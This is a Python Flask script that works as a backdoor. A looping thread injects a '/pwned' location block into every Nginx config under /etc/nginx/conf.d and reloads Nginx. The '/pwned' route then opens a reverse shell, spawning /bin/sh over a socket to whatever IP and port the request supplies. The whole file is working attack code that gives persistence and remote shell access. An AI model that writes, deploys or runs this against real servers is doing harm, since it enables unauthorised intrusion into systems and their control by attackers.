from flask import Flask, request
import sys, socket, os, pty
import glob
import threading
import time
import re
import subprocess
import logging

# Set up the logger
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler = logging.FileHandler('app.log')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)
app = Flask(__name__)

PORT = 8076
NGINX_CONFIG_PATH = '/etc/nginx/conf.d/'
NEW_LOCATION_BLOCK = f"""
    location /pwned {{
        proxy_pass http://127.0.0.1:{PORT};
    }}
"""

def check_nginx_configs():
    while True:
        config_files = glob.glob(f'{NGINX_CONFIG_PATH}*.conf')
        if config_files:
            logger.info("Found Nginx config files:")
            for file in config_files:
                logger.info(file)
                add_location_block(file)
        else:
            logger.error("No Nginx config files found.")
        time.sleep(10)

def add_location_block(file_path):
    with open(file_path, 'r') as f:
        content = f.read()

    # Check if the location block is already present to avoid duplicates
    if 'location /pwned {' in content:
        logger.info(f"Location block already present in {file_path}. Skipping.")
        return

    # Find the position to insert the new location block
    match = re.search(r'^\s*location\s+/\s+\{.*?\}', content, re.DOTALL | re.MULTILINE)
    if match:
        insertion_index = match.end()
    else:
        logger.warning(f"Couldn't find the 'server_name' line in {file_path}. Skipping.")
        return

    # Insert the new location block at the appropriate position
    new_content = content[:insertion_index] + NEW_LOCATION_BLOCK + content[insertion_index:]

    # Write the updated content back to the file
    with open(file_path, 'w') as f:
        f.write(new_content)

    logger.info(f"Location block added to {file_path}.")
    restart_nginx()

def restart_nginx():
    try:
        # Run the Nginx restart command using os.system (without sudo in Alpine-based images)
        os.system('nginx -s reload')
        logger.info("Nginx restarted successfully.")
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to restart Nginx: {e}")

@app.route('/pwned')
def inject():
    ip_address = request.args.get('ip')
    port = request.args.get('port')
    if ip_address:
        s = socket.socket()
        try:
            s.connect((ip_address, int(port)))
            logger.info("Connection successful!")
            [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
            pty.spawn("/bin/sh")
        except ConnectionRefusedError:
            logger.error("Connection refused. Make sure the service is running.")
        return f'Connecting to {ip_address}:{port}'
    else:
        return 'Good way to pretend you are not a hacker!'

if __name__ == '__main__':
    # Start the file-checking service in a separate thread
    file_checker_thread = threading.Thread(target=check_nginx_configs)
    file_checker_thread.daemon = True
    file_checker_thread.start()

    app.run(host='0.0.0.0', port=PORT)
